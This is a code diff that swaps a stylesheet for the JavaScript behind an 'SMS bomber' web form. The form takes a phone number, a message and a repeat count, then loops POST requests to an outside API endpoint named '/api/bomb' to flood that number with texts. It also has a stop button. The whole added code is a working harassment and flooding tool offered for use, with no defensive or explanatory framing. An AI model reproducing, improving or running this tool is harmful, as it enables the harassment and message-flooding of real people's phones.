@@ -1,90 +1,52 @@
-body {
-    font-family: 'Courier New', monospace;
-    background-color: #000;
-    color: #0f0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-    margin: 0;
-    overflow: hidden;
-}
+let isSending = false;
 
-.container {
-    background-color: #111;
-    padding: 20px;
-    border-radius: 8px;
-    box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
-    width: 300px;
-    text-align: center;
-    border: 2px solid #0f0;
-}
+document.getElementById('bomberForm').addEventListener('submit', function(event) {
+    event.preventDefault();
 
-h1 {
-    margin-bottom: 20px;
-    font-size: 2em;
-    text-shadow: 0 0 5px #0f0;
-}
+    const phoneNumber = document.getElementById('phoneNumber').value;
+    const message = document.getElementById('message').value;
+    const count = document.getElementById('count').value;
 
-form {
-    display: flex;
-    flex-direction: column;
-}
+    const resultDiv = document.getElementById('result');
+    resultDiv.textContent = '';
 
-label {
-    margin-bottom: 5px;
-    font-size: 1.2em;
-}
+    if (isSending) {
+        resultDiv.textContent = 'Messages are already being sent. Please wait or stop the process.';
+        return;
+    }
 
-input {
-    margin-bottom: 15px;
-    padding: 10px;
-    border: 1px solid #0f0;
-    border-radius: 4px;
-    background-color: #000;
-    color: #0f0;
-    font-size: 1.1em;
-}
+    isSending = true;
 
-.button-group {
-    display: flex;
-    justify-content: space-between;
-    margin-top: 10px;
-}
+    for (let i = 0; i < count; i++) {
+        if (!isSending) break;
 
-button {
-    padding: 10px;
-    background-color: #0f0;
-    color: #000;
-    border: none;
-    border-radius: 4px;
-    cursor: pointer;
-    font-size: 1.2em;
-    text-shadow: 0 0 5px #0f0;
-}
+        fetch('https://kalua-sms-edge.vercel.app/api/bomb', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                phoneNumber: phoneNumber,
+                message: message
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                resultDiv.textContent += `Message ${i + 1} sent successfully!\n`;
+            } else {
+                resultDiv.textContent += `Failed to send message ${i + 1}.\n`;
+            }
+        })
+        .catch(error => {
+            resultDiv.textContent += `Error sending message ${i + 1}: ${error.message}\n`;
+        });
+    }
 
-button:hover {
-    background-color: #0ff;
-}
+    isSending = false;
+});
 
-#stopButton {
-    background-color: #f00;
-    color: #fff;
-    text-shadow: 0 0 5px #f00;
-}
-
-#stopButton:hover {
-    background-color: #ff0;
-}
-
-#result {
-    margin-top: 20px;
-    font-size: 1.1em;
-    text-align: left;
-    padding: 10px;
-    background-color: #000;
-    border: 1px solid #0f0;
-    border-radius: 4px;
-    overflow-y: auto;
-    max-height: 200px;
-}
+document.getElementById('stopButton').addEventListener('click', function() {
+    isSending = false;
+    document.getElementById('result').textContent += 'Sending messages stopped.\n';
+});
